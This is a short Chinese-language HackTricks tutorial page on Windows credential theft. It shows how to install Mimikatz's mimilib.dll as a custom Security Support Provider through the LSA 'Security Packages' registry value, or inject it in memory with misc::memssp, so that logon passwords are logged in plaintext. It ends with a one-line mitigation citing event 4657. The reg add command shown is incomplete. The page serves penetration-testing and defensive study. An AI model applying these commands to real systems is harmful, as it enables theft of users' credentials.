# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[了解什么是 SSP (Security Support Provider) 在这里。](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
您可以创建您自己的 **SSP** 来 **捕获** 以 **明文** 形式使用的 **凭据** 以访问机器。

#### Mimilib

您可以使用 Mimikatz 提供的 `mimilib.dll` 二进制文件。**这将把所有凭据以明文形式记录在一个文件中。**\
将 dll 放入 `C:\Windows\System32\`\
获取现有 LSA 安全包的列表：
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
将 `mimilib.dll` 添加到安全支持提供程序列表（安全包）：
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
在重启后，所有凭据可以在 `C:\Windows\System32\kiwissp.log` 中以明文形式找到。

#### 在内存中

您还可以直接使用 Mimikatz 在内存中注入此内容（请注意，这可能有点不稳定/无法工作）：
```powershell
privilege::debug
misc::memssp
```
这不会在重启后存活。

#### 缓解措施

事件 ID 4657 - 审计创建/更改 `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
